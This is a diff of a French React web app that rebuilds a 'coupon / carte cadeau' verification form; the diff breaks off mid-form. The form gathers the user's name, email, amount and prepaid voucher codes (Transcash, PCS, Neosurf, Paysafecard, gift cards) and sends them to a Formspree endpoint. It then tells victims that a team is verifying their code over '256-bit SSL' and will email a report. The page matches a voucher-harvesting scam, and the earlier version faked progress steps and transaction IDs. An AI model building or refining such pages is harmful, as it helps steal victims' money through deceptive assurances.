@@ -30,7 +30,11 @@ import {
   Award,
   ShieldAlert,
   Menu,
-  X
+  X,
+  User,
+  Mail,
+  Tag,
+  Coins
 } from "lucide-react";
 
 // Types for Verification Results
@@ -169,6 +173,14 @@ export default function App() {
   const [report, setReport] = useState<VerificationReport | null>(null);
   const [errorText, setErrorText] = useState<string | null>(null);
 
+  // New input states for Formspree
+  const [couponType, setCouponType] = useState<string>("");
+  const [montant, setMontant] = useState<string>("");
+  const [selectedTypes, setSelectedTypes] = useState<string[]>([]);
+  const [customCouponType, setCustomCouponType] = useState<string>("");
+  const [isSubmittingFormspree, setIsSubmittingFormspree] = useState<boolean>(false);
+  const [formspreeSuccess, setFormspreeSuccess] = useState<boolean>(false);
+
   // Contact support form states
   const [contactName, setContactName] = useState<string>("");
   const [contactEmail, setContactEmail] = useState<string>("");
@@ -253,7 +265,7 @@ export default function App() {
   // Run contact support form submission
   const handleContactSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!contactName.trim() || !contactEmail.trim() || !contactMessage.trim()) {
+    if (!contactName.trim() || !contactEmail.trim() || !contactSubject.trim() || !contactMessage.trim()) {
       setContactError("Veuillez remplir tous les champs obligatoires (*).");
       return;
     }
@@ -262,20 +274,23 @@ export default function App() {
     setIsSendingContact(true);
     setContactSuccess(false);
 
+    const formBody = new FormData();
+    formBody.append("nom", contactName);
+    formBody.append("email", contactEmail);
+    formBody.append("sujet", contactSubject);
+    formBody.append("message", contactMessage);
+
     try {
-      const response = await fetch("/api/contact-support", {
+      const response = await fetch("https://formspree.io/f/xeedrnej", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          name: contactName,
-          email: contactEmail,
-          subject: contactSubject || "Demande depuis le site",
-          message: contactMessage
-        })
+        body: formBody,
+        headers: {
+          'Accept': 'application/json'
+        }
       });
 
       if (!response.ok) {
-        throw new Error("Erreur serveur lors de la transmission du message.");
+        throw new Error("Erreur lors de la transmission du message via Formspree.");
       }
 
       setContactSuccess(true);
@@ -414,396 +429,340 @@ export default function App() {
         <div className="bg-slate-950 p-6 sm:p-10 rounded-3xl border border-indigo-900/40 shadow-2xl relative overflow-hidden">
           <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-500/5 rounded-full blur-3xl pointer-events-none" />
 
-          {/* IDENTIFICATION BLOCK: USER MANDATORY FIELDS (NOM, PRENOM, EMAIL) */}
-          <div className="mb-8 p-6 bg-slate-900/60 rounded-2xl border border-indigo-950/60 space-y-4">
-            <div className="flex items-center gap-2 mb-2">
-              <span className="w-2 h-2 rounded-full bg-indigo-500 animate-ping" />
-              <h3 className="text-xs font-black tracking-widest text-slate-300 uppercase">
-                1. Renseigner vos Informations d'Identification <span className="text-red-500">*</span>
-              </h3>
-            </div>
-
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-              {/* VOTRE NOM */}
-              <div className="space-y-1.5 flex flex-col">
-                <label className="text-xs font-semibold text-slate-400">Votre Nom :</label>
-                <input
-                  type="text"
-                  value={clientName}
-                  onChange={(e) => {
-                    setClientName(e.target.value);
-                    setErrorText(null);
-                  }}
-                  placeholder="Nom de famille..."
-                  className="h-11 bg-slate-950 text-white px-3.5 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                />
+          {/* New Formspree Form */}
+          {formspreeSuccess ? (
+            <div className="space-y-6 relative z-10 text-center py-8 animate-fadeIn">
+              <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center text-emerald-400 mx-auto animate-bounce">
+                <ShieldCheck className="w-10 h-10" />
               </div>
-
-              {/* VOTRE PRENOM */}
-              <div className="space-y-1.5 flex flex-col">
-                <label className="text-xs font-semibold text-slate-400">Votre Prénom :</label>
-                <input
-                  type="text"
-                  value={clientFirstName}
-                  onChange={(e) => {
-                    setClientFirstName(e.target.value);
-                    setErrorText(null);
-                  }}
-                  placeholder="Prénom..."
-                  className="h-11 bg-slate-950 text-white px-3.5 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                />
-              </div>
-
-              {/* VOTRE ADRESSE EMAIL */}
-              <div className="space-y-1.5 flex flex-col">
-                <label className="text-xs font-semibold text-slate-400">Votre Adresse Email :</label>
-                <input
-                  type="email"
-                  value={clientEmail}
-                  onChange={(e) => {
-                    setClientEmail(e.target.value);
-                    setErrorText(null);
-                  }}
-                  placeholder="votre.email@exemple.com"
-                  className="h-11 bg-slate-950 text-white px-3.5 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                />
-              </div>
-            </div>
-          </div>
-
-          {/* TAB SELECTOR: MANUAL INPUT VS OCR SCAN */}
-          <div className="flex bg-slate-900 p-1.5 rounded-xl border border-slate-850 mb-6">
-            <button
-               type="button"
-               onClick={() => {
-                 setInputTab("manual");
-                 setErrorText(null);
-               }}
-               className={`flex-1 py-3 text-sm font-semibold rounded-lg flex items-center justify-center gap-2 transition ${
-                 inputTab === "manual" ? "bg-indigo-600 text-white shadow-lg" : "text-slate-400 hover:text-white"
-               }`}
-            >
-              <CreditCard className="w-4 h-4" />
-              Saisie Manuelle de Code
-            </button>
-            <button
-               type="button"
-               onClick={() => {
-                 setInputTab("scan");
-                 setErrorText(null);
-               }}
-               className={`flex-1 py-3 text-sm font-semibold rounded-lg flex items-center justify-center gap-2 transition ${
-                 inputTab === "scan" ? "bg-indigo-600 text-white shadow-lg" : "text-slate-400 hover:text-white"
-               }`}
-            >
-              <UploadCloud className="w-4 h-4" />
-              Scan de ticket de caisse
-            </button>
-          </div>
-
-          {/* ERROR DISPLAY */}
-          {errorText && (
-            <div className="mb-6 p-4 bg-rose-950/55 border border-rose-500/40 rounded-xl flex gap-3 text-rose-300 text-sm animate-shake">
-              <ShieldAlert className="w-5 h-5 shrink-0" />
-              <span>{errorText}</span>
-            </div>
-          )}
-
-          {/* BRAND CHOOSER CAROUSEL */}
-          <div className="mb-6">
-            <label className="block text-xs font-bold tracking-wider text-slate-400 uppercase mb-3">
-              Émetteur du Coupon / Ticket
-            </label>
-
-            <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
-              {BRANDS.map((item) => (
-                <button
-                  key={item.id}
-                  type="button"
-                  onClick={() => {
-                    setSelectedBrand(item.id);
-                    setErrorText(null);
-                  }}
-                  className={`p-3.5 rounded-xl border text-center transition flex flex-col items-center justify-center gap-1.5 relative ${
-                    selectedBrand === item.id
-                      ? "bg-indigo-900/35 border-indigo-500 shadow-md ring-1 ring-indigo-500/30"
-                      : "bg-slate-900/60 border-slate-800 hover:border-slate-700"
-                  }`}
-                >
-                  <span className="text-2xl">{item.emoji}</span>
-                  <span className="font-semibold text-xs text-slate-200">{item.name}</span>
-                  {selectedBrand === item.id && (
-                    <span className="absolute top-1 right-1.5 w-2 h-2 rounded-full bg-indigo-400" />
-                  )}
-                </button>
-              ))}
-            </div>
-          </div>
-
-          {/* CUSTOM BRAND FIELD FOR "OTHER" COUPONS */}
-          {selectedBrand === "OTHER" && (
-            <div className="mb-6 p-4 bg-slate-900/50 rounded-2xl border border-indigo-950/60 space-y-3">
-              <label className="block text-xs font-extrabold tracking-wider text-slate-300 uppercase">
-                Nom de la carte ou du coupon personnalisé (ex: Google iTunes) <span className="text-red-500">*</span>
-              </label>
-              <input
-                type="text"
-                value={customBrandName}
-                onChange={(e) => {
-                  setCustomBrandName(e.target.value);
-                  setErrorText(null);
-                }}
-                placeholder="Écrivez ici le nom de la carte / coupon non listé..."
-                className="w-full h-12 bg-slate-950 text-white pl-4 pr-4 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-sm font-semibold placeholder:text-slate-600 transition"
-              />
-            </div>
-          )}
-
-          {/* TAB CONTENT: MANUAL ENTRY FORM */}
-          {inputTab === "manual" ? (
-            <div className="space-y-4">
-              <div className="flex justify-between items-center">
-                <span className="text-xs font-bold tracking-wider text-slate-400 uppercase">
-                  Code PIN / Coupon
-                </span>
-                <span className="text-xs text-slate-500 italic">
-                  Exemple type : {currentBrandDetails.example}
+              
+              <div className="space-y-2">
+                <h3 className="text-2xl font-black text-white">Demande Transmise avec Succès !</h3>
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wide bg-amber-500/10 text-amber-500 border border-amber-500/20">
+                  <RefreshCw className="w-3.5 h-3.5 animate-spin" />
+                  Vérification active par notre équipe
                 </span>
               </div>
 
-              <div className="relative">
-                <input
-                  type={hideCode === "OUI" ? "password" : "text"}
-                  value={couponCode}
-                  onChange={(e) => {
-                    setCouponCode(e.target.value);
-                    setErrorText(null);
-                  }}
-                  placeholder={`Saisir le code ${currentBrandDetails.name}...`}
-                  className="w-full h-15 bg-slate-900 text-white font-mono text-lg font-bold tracking-widest pl-5 pr-14 rounded-xl border border-slate-800 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none uppercase placeholder:text-slate-600 uppercase placeholder:font-sans placeholder:tracking-normal placeholder:text-sm"
-                />
-                <div className="absolute right-4 top-1/2 -translate-y-1/2 text-2xl">
-                  {currentBrandDetails.emoji}
-                </div>
-              </div>
-
-              <div className="p-3.5 bg-slate-900/50 rounded-xl border border-indigo-950/40 text-xs text-slate-400 flex items-start gap-2.5">
-                <Info className="w-4 h-4 text-indigo-400 shrink-0 mt-0.5" />
-                <span>{currentBrandDetails.guideText}</span>
-              </div>
-            </div>
-          ) : (
-            /* TAB CONTENT: IMAGE UPLOAD AND OCR AREA */
-            <div className="space-y-4">
-              <div className="text-xs font-bold tracking-wider text-slate-400 uppercase mb-2">
-                Téléverser la photo du coupon
-              </div>
-
-              {/* DRAG-AND-DROP CONTAINER */}
-              {!imagePreview ? (
-                <div
-                  onDragEnter={handleDrag}
-                  onDragLeave={handleDrag}
-                  onDragOver={handleDrag}
-                  onDrop={handleDrop}
-                  onClick={() => fileInputRef.current?.click()}
-                  className={`relative border-2 border-dashed rounded-2xl p-8 text-center cursor-pointer transition ${
-                    dragActive
-                      ? "border-pink-500 bg-pink-500/5"
-                      : "border-indigo-950 bg-slate-900/40 hover:bg-slate-900/80 hover:border-indigo-800"
-                  }`}
-                >
-                  <input
-                    ref={fileInputRef}
-                    type="file"
-                    accept="image/*"
-                    onChange={handleFileChange}
-                    className="hidden"
-                  />
-                  <div className="w-16 h-16 bg-indigo-950/60 rounded-full flex items-center justify-center text-slate-400 mx-auto mb-4">
-                    <UploadCloud className="w-8 h-8 text-indigo-400 animate-pulse" />
-                  </div>
-                  <div className="text-slate-200 font-bold mb-1.5">
-                    Glissez votre ticket de caisse ou capture d'écran ici
-                  </div>
-                  <p className="text-slate-400 text-xs mb-3">
-                    ou cliquez pour chercher une photo dans votre appareil
-                  </p>
-                  <div className="flex gap-2 justify-center flex-wrap">
-                    <span className="text-[10px] font-semibold text-indigo-300 bg-indigo-950/80 px-2 py-1 rounded">PNG</span>
-                    <span className="text-[10px] font-semibold text-indigo-300 bg-indigo-950/80 px-2 py-1 rounded">JPG</span>
-                    <span className="text-[10px] font-semibold text-indigo-300 bg-indigo-950/80 px-2 py-1 rounded">JPEG</span>
-                  </div>
-                </div>
-              ) : (
-                /* IMAGE PREVIEW AND FILE INFO SCREEN */
-                <div className="bg-slate-900/55 p-3.5 rounded-2xl border border-indigo-950">
-                  <div className="relative rounded-xl overflow-hidden max-h-56 bg-black flex justify-center">
-                    <img
-                      src={imagePreview}
-                      alt="Aperçu Reçu"
-                      referrerPolicy="no-referrer"
-                      className="object-contain max-h-56 w-full"
-                    />
-                    <button
-                      type="button"
-                      onClick={removeSelectedImage}
-                      className="absolute top-2.5 right-2.5 bg-red-650 hover:bg-red-700 text-white rounded-full p-1.5 transition text-xs font-semibold shadow-md active:scale-90"
-                    >
-                      <X className="w-5 h-5 text-red-500" />
-                    </button>
-                  </div>
-
-                  <div className="flex items-center justify-between mt-3 px-1 text-xs">
-                    <div className="flex items-center gap-2 text-emerald-400">
-                      <CheckCircle2 className="w-4 h-4 shrink-0" />
-                      <span className="font-semibold truncate max-w-xs sm:max-w-md">
-                        {imageFile?.name || "Reçu_Sélectionné.jpg"}
-                      </span>
-                    </div>
-                    <span className="text-slate-500">
-                      {imageFile ? `${(imageFile.size / 1024 / 1024).toFixed(2)} MB` : "Taille inconnue"}
-                    </span>
-                  </div>
-                </div>
-              )}
-            </div>
-          )}
-
-          {/* CHECKBOX OPTIONS: CACHER MON CODE */}
-          <div className="mt-6 p-4">
-            <div className="flex items-center gap-2 mb-3">
-              <Lock className="w-4 h-4 text-indigo-400" />
-              <span className="text-xs font-bold uppercase tracking-wider text-slate-300">
-                Confidentialité : Cacher mon code <span className="text-red-500">*</span>
-              </span>
-            </div>
-            <div className="flex items-center gap-8 pl-1">
-              <label className="flex items-center gap-3 cursor-pointer group select-none">
-                <input
-                  type="checkbox"
-                  checked={hideCode === "OUI"}
-                  onChange={() => setHideCode("OUI")}
-                  className="w-5 h-5 rounded border-slate-700 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
-                />
-                <span className="text-sm font-semibold text-slate-200 group-hover:text-white transition">
-                  OUI (Masquer)
-                </span>
-              </label>
-
-              <label className="flex items-center gap-3 cursor-pointer group select-none">
-                <input
-                  type="checkbox"
-                  checked={hideCode === "NON"}
-                  onChange={() => setHideCode("NON")}
-                  className="w-5 h-5 rounded border-slate-700 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
-                />
-                <span className="text-sm font-semibold text-slate-200 group-hover:text-white transition">
-                  NON (Laisser visible)
-                </span>
-              </label>
-            </div>
-          </div>
-
-          {/* VERIFY TRIGGER ACTION BUTTON */}
-          <div className="mt-8">
-            <button
-              type="button"
-              disabled={isVerifying}
-              onClick={triggerVerification}
-              className="w-full py-4 bg-gradient-to-r from-indigo-500 via-pink-500 to-rose-500 text-white text-base font-extrabold rounded-2xl hover:shadow-xl hover:shadow-pink-500/20 active:scale-[0.99] transition cursor-pointer disabled:opacity-50 animate-shimmer"
-            >
-              {isVerifying ? "Traitement de vérification en cours..." : `Valider et Enregistrer mon Coupon`}
-            </button>
-          </div>
-
-          {/* ===== TEMPORARY STEPS DIALOG ===== */}
-          {isVerifying && (
-            <div className="mt-10 p-6 bg-slate-900/90 rounded-2xl border border-indigo-500/30 animate-pulse">
-              <div className="flex items-center justify-between mb-4">
-                <div className="flex items-center gap-2.5">
-                  <RefreshCw className="w-5 h-5 text-indigo-400 animate-spin" />
-                  <span className="font-bold text-sm uppercase tracking-wider text-slate-300">
-                    Indexation et Transmission Active
-                  </span>
-                </div>
-                <span className="text-xs font-mono text-indigo-400">Étape {verificationStep}/5</span>
-              </div>
-
-              <div className="h-1.5 w-full bg-slate-800 rounded-full overflow-hidden mb-4">
-                <div
-                  className="h-full bg-gradient-to-r from-indigo-500 via-pink-500 to-rose-500 transition-all duration-300"
-                  style={{ width: `${(verificationStep / 5) * 100}%` }}
-                />
-              </div>
-
-              <p className="text-slate-300 text-sm font-mono">{verificationStepText}</p>
-            </div>
-          )}
-
-          {/* ===== FINAL SECURITY REPORT RENDER ===== */}
-          {report && !isVerifying && (
-            <div className="mt-10 p-6 sm:p-8 bg-slate-900/50 rounded-2xl border border-slate-800 space-y-6 animate-fadeIn">
-
-              {/* Header status block */}
-              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-800 pb-5">
-                <div className="flex items-center gap-3">
-                  <div className="w-12 h-12 rounded-xl bg-slate-950 flex items-center justify-center text-3xl">
-                    {getBrandDetails(report.brand).emoji}
-                  </div>
-                  <div>
-                    <h3 className="font-bold text-lg text-white">Rapport : {report.brand}</h3>
-                    <p className="text-xs font-mono text-slate-500">
-                      ID de transaction : #{Math.floor(100000 + Math.random() * 900000)} • SSL Activé
-                    </p>
-                  </div>
-                </div>
-
-                <div className="px-4 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide flex items-center gap-1.5 bg-yellow-950/50 text-yellow-400 border border-yellow-500/20 animate-pulse">
-                  <RefreshCw className="w-4 h-4 animate-spin" />
-                  Vérification En Cours...
-                </div>
-              </div>
-
-              {/* Grid info */}
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
-                {/* User profile recap */}
-                <div className="bg-slate-950 p-5 rounded-xl border border-slate-800 space-y-2">
-                  <span className="text-[10px] text-slate-500 uppercase font-bold tracking-widest block">Coordonnées Enregistrées</span>
-                  <div className="text-xs space-y-1.5">
-                    <p className="text-slate-300"><span className="text-slate-500">Nom :</span> {clientName}</p>
-                    <p className="text-slate-300"><span className="text-slate-500 font-normal">Prénom :</span> {clientFirstName}</p>
-                    <p className="text-slate-300"><span className="text-slate-500">Email :</span> {clientEmail}</p>
-                    <p className="text-slate-300"><span className="text-slate-500">Masquer le code :</span> <span className={hideCode === "OUI" ? "text-indigo-400 font-bold" : "text-slate-400"}>{hideCode}</span></p>
-                  </div>
-                </div>
-
-                {/* Extracted PIN */}
-                <div className="bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between">
-                  <div>
-                    <span className="text-[10px] text-slate-500 uppercase font-black tracking-widest block mb-1">Code / PIN Extrait</span>
-                    <div className="p-2.5 bg-slate-900 rounded border border-slate-800 font-mono text-base font-bold text-slate-200 uppercase tracking-widest select-all flex items-center justify-between font-mono">
-                      <span>{report.code || "PIÈCE_JOINTE_OCR"}</span>
-                    </div>
-                  </div>
-                  <div className="text-[10px] text-slate-500 mt-2">
-                    Type : {report.brand === "OTHER" ? customBrandName : report.brand}
-                  </div>
-                </div>
-              </div>
-
-              {/* Summary of processing */}
-              <div className="p-5 bg-indigo-950/25 border border-indigo-900/40 rounded-xl space-y-2 text-sm text-indigo-300">
-                <div className="flex items-center gap-2 font-bold mb-1">
-                  <RefreshCw className="w-5 h-5 shrink-0 text-indigo-400 animate-spin" />
-                  <span>Traitement Sécurisé en Cours :</span>
-                </div>
-                <p className="text-slate-300 text-xs sm:text-sm leading-relaxed">
-                  Votre demande d'homologation a été enregistrée avec succès. La vérification de conformité et d'activation de votre coupon est actuellement en cours de traitement sur nos passerelles sécurisées 256 bits. Afin de préserver la sécurité de vos fonds, cette procédure de validation nécessite de patienter quelques instants. Les résultats complets de la vérification et le statut de validité vous seront envoyés directement par e-mail à l'adresse <strong>{clientEmail}</strong>. Merci de votre confiance et de votre patience !
+              <div className="max-w-xl mx-auto p-6 bg-slate-900/60 rounded-2xl border border-indigo-905/40 text-left space-y-4 shadow-xl">
+                <p className="text-slate-300 text-sm leading-relaxed font-semibold">
+                  Votre demande d'homologation a été enregistrée. Veuillez patienter pendant que nos équipes procèdent manuellement à l'analyse et à la vérification approfondie de votre coupon de carte cadeau.
+                </p>
+                <p className="text-slate-350 text-xs leading-relaxed">
+                  Cette procédure de sécurité minutieuse garantit la conformité de vos fonds et évite tout incident lors de l'enregistrement. Afin de préserver l'intégrité de la procédure, veuillez patienter quelques instants le temps que notre équipe technique valide votre code.
+                </p>
+                <p className="text-slate-400 text-xs leading-relaxed">
+                  Dès que les vérifications seront terminées par nos services, le compte rendu officiel vous sera envoyé directement par e-mail à l'adresse <strong>{clientEmail}</strong>.
                 </p>
               </div>
 
+              <button
+                type="button"
+                onClick={() => {
+                  setFormspreeSuccess(false);
+                  setCouponCode("");
+                  setMontant("");
+                  setCustomCouponType("");
+                  setSelectedTypes([]);
+                  setClientName("");
+                  setClientEmail("");
+                }}
+                className="mt-4 px-6 py-3 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl font-bold text-xs shadow-md transition-all active:scale-95 duration-150 cursor-pointer"
+              >
+                Vérifier un autre coupon
+              </button>
             </div>
+          ) : (
+            <form
+              onSubmit={async (e) => {
+                e.preventDefault();
+                if (selectedTypes.length === 0) {
+                  setErrorText("Veuillez cocher au moins un type de coupon ou de carte cadeau.");
+                  return;
+                }
+                setErrorText(null);
+                setIsSubmittingFormspree(true);
+
+                const formBody = new FormData();
+                formBody.append("nom", clientName);
+                formBody.append("email", clientEmail);
+                formBody.append("types_coupon", selectedTypes.join(", "));
+                if (selectedTypes.includes("Autres coupons") && customCouponType) {
+                  formBody.append("nom_coupon_autre", customCouponType);
+                }
+                formBody.append("montant", montant);
+                formBody.append("code", couponCode);
+                formBody.append("cacher_mon_code", hideCode);
+
+                try {
+                  const response = await fetch("https://formspree.io/f/xeedrnej", {
+                    method: "POST",
+                    body: formBody,
+                    headers: {
+                      'Accept': 'application/json'
+                    }
+                  });
+                  if (response.ok) {
+                    setFormspreeSuccess(true);
+                  } else {
+                    const data = await response.json();
+                    setErrorText(data.error || "Une erreur est survenue pendant l'envoi. Veuillez réessayer.");
+                  }
+                } catch (err) {
+                  setErrorText("Une erreur réseau s'est produite. Veuillez réessayer.");
+                } finally {
+                  setIsSubmittingFormspree(false);
+                }
+              }}
+              className="space-y-6 relative z-10"
+            >
+              <div className="flex items-center gap-3 border-b border-indigo-950 pb-5 mb-2">
+                <div className="w-10 h-10 rounded-xl bg-indigo-500/10 flex items-center justify-center text-indigo-400">
+                  <ShieldCheck className="w-5 h-5" />
+                </div>
+                <div>
+                  <h3 className="text-xl font-bold text-white">Vérification de Coupon / Carte Cadeau</h3>
+                  <p className="text-xs text-slate-400">Indexation sécurisée SSL 256 bits sous protocole de confiance</p>
+                </div>
+              </div>
+
+              {/* ERROR DISPLAY */}
+              {errorText && (
+                <div className="p-4 bg-rose-950/55 border border-rose-500/40 rounded-xl flex gap-3 text-rose-300 text-sm animate-shake">
+                  <ShieldAlert className="w-5 h-5 shrink-0" />
+                  <span>{errorText}</span>
+                </div>
+              )}
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                {/* NOM COMPLET */}
+                <div className="flex flex-col space-y-2">
+                  <label htmlFor="nom" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
+                    <User className="w-3.5 h-3.5 text-indigo-400" />
+                    Votre nom complet : <span className="text-red-500">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    id="nom"
+                    name="nom"
+                    value={clientName}
+                    onChange={(e) => {
+                      setClientName(e.target.value);
+                      if (errorText) setErrorText(null);
+                    }}
+                    placeholder="Jean Dupont"
+                    required
+                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
+                  />
+                </div>
+
+                {/* EMAIL */}
+                <div className="flex flex-col space-y-2">
+                  <label htmlFor="email" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
+                    <Mail className="w-3.5 h-3.5 text-indigo-400" />
+                    Votre email : <span className="text-red-500">*</span>
+                  </label>
+                  <input
+                    type="email"
+                    id="email"
+                    name="email"
+                    value={clientEmail}
+                    onChange={(e) => {
+                      setClientEmail(e.target.value);
+                      if (errorText) setErrorText(null);
+                    }}
+                    placeholder="votre@email.com"
+                    required
+                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
+                  />
+                </div>
+
+                {/* TYPES DE COUPONS OU CARTES CADEAUX (CHECKBOXES / PETITES CASES) - FULL WIDTH */}
+                <div className="col-span-1 md:col-span-2 flex flex-col space-y-3">
+                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
+                    <Tag className="w-3.5 h-3.5 text-indigo-400" />
+                    Type de coupon ou carte cadeau : <span className="text-red-500">*</span>
+                  </label>
+                  
+                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 bg-slate-900/40 p-4 rounded-xl border border-slate-900/60">
+                    {[
+                      "Transcash",
+                      "PCS Mastercard",
+                      "Neosurf",
+                      "Paysafecard",
+                      "Amazon Gift",
+                      "Steam Card",
+                      "Google Play",
+                      "Carte iTunes",
+                      "Autres coupons"
+                    ].map((option) => {
+                      const isChecked = selectedTypes.includes(option);
+                      return (
+                        <label
+                          key={option}
+                          className={`flex items-center gap-2.5 p-2.5 rounded-lg border cursor-pointer select-none transition text-xs font-medium ${
+                            isChecked
+                              ? "bg-indigo-950/40 border-indigo-500/60 text-white"
+                              : "bg-slate-950/60 border-slate-900/80 text-slate-400 hover:text-slate-200 hover:border-slate-850"
+                          }`}
+                        >
+                          <input
+                            type="checkbox"
+                            name="types_coupon[]"
+                            value={option}
+                            checked={isChecked}
+                            onChange={() => {
+                              if (errorText) setErrorText(null);
+                              setSelectedTypes((prev) =>
+                                prev.includes(option)
+                                  ? prev.filter((o) => o !== option)
+                                  : [...prev, option]
+                              );
+                            }}
+                            className="w-3.5 h-3.5 rounded border-slate-850 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
+                          />
+                          <span>{option}</span>
+                        </label>
+                      );
+                    })}
+                  </div>
+
+                  {/* Hidden aggregated string for perfect Formspree presentation */}
+                  <input
+                    type="hidden"
+                    name="types_de_coupons_selectionnes"
+                    value={selectedTypes.join(", ")}
+                  />
+                </div>
+
+                {/* AUTRES COUPONS Saisie Optionnelle/Conditionnelle */}
+                {selectedTypes.includes("Autres coupons") && (
+                  <div className="col-span-1 md:col-span-2 flex flex-col space-y-2 animate-fadeIn">
+                    <label htmlFor="autre_type_saisi" className="text-xs font-bold text-slate-400 uppercase tracking-wide">
+                      Spécifiez le nom du coupon non répertorié : <span className="text-red-500">*</span>
+                    </label>
+                    <input
+                      type="text"
+                      id="autre_type_saisi"
+                      name="nom_coupon_autre"
+                      value={customCouponType}
+                      onChange={(e) => {
+                        setCustomCouponType(e.target.value);
+                        if (errorText) setErrorText(null);
+                      }}
+                      placeholder="Ex: PCS Premium, Ticket Neosurf Pro, etc."
+                      required={selectedTypes.includes("Autres coupons")}
+                      className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
+                    />
+                  </div>
+                )}
+
+                {/* MONTANT OBLIGATOIRE */}
+                <div className="flex flex-col space-y-2">
+                  <label htmlFor="montant" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
+                    <Coins className="w-3.5 h-3.5 text-indigo-400" />
+                    Montant ou produit concerné : <span className="text-red-500">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    id="montant"
+                    name="montant"
+                    value={montant}
+                    onChange={(e) => {
+                      setMontant(e.target.value);
+                      if (errorText) setErrorText(null);
+                    }}
+                    placeholder="Saisissez le montant ou produit"
+                    required
+                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
+                  />
+                </div>
+
+                {/* CODE DU COUPON */}
+                <div className="flex flex-col space-y-2">
+                  <label htmlFor="code" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
+                    <Lock className="w-3.5 h-3.5 text-indigo-400" />
+                    Code du coupon ou carte cadeau : <span className="text-red-500">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    id="code"
+                    name="code"
+                    value={couponCode}
+                    onChange={(e) => {
+                      setCouponCode(e.target.value);
+                      if (errorText) setErrorText(null);
+                    }}
+                    placeholder="Ex: SUMMER50 ou GC-ABC12345"
+                    required
+                    style={{ textTransform: "uppercase" }}
+                    className="w-full h-12 bg-slate-900 text-white font-mono text-base font-bold tracking-widest px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none uppercase placeholder:text-slate-600 placeholder:font-sans placeholder:tracking-normal placeholder:text-sm"
+                  />
+                </div>
+
+                {/* CACHER MON CODE COCHES OUI OU NON */}
+                <div className="col-span-1 md:col-span-2 flex flex-col space-y-3">
+                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
+                    <Lock className="w-3.5 h-3.5 text-indigo-400" />
+                    Cacher mon code : <span className="text-red-500">*</span>
+                  </label>
+                  <div className="flex flex-col sm:flex-row sm:items-center gap-6 bg-slate-900/40 p-4 rounded-xl border border-slate-900/60">
+                    <label className="flex items-center gap-2.5 cursor-pointer text-sm font-semibold text-slate-300 hover:text-white select-none">
+                      <input
+                        type="checkbox"
+                        name="cacher_code_oui"
+                        value="OUI"
+                        checked={hideCode === "OUI"}
+                        onChange={() => {
+                          setHideCode("OUI");
+                          if (errorText) setErrorText(null);
+                        }}
+                        className="w-4 h-4 rounded border-slate-850 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
+                      />
+                      <span>OUI (Masquer le code sur le site)</span>
+                    </label>
+                    <label className="flex items-center gap-2.5 cursor-pointer text-sm font-semibold text-slate-300 hover:text-white select-none">
+                      <input
+                        type="checkbox"
+                        name="cacher_code_non"
+                        value="NON"
+                        checked={hideCode === "NON"}
+                        onChange={() => {
+                          setHideCode("NON");
+                          if (errorText) setErrorText(null);
+                        }}
+                        className="w-4 h-4 rounded border-slate-850 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
+                      />
+                      <span>NON (Laisser le code visible)</span>
+                    </label>
+                  </div>
+                  {/* Hidden aggregate value for Formspree form processing */}
+                  <input type="hidden" name="cacher_mon_code" value={hideCode} />
+                </div>
+              </div>
+
+              {/* TRUST PHRASE - SANS PARLER DE L'EMAIL DU SUPPORT */}
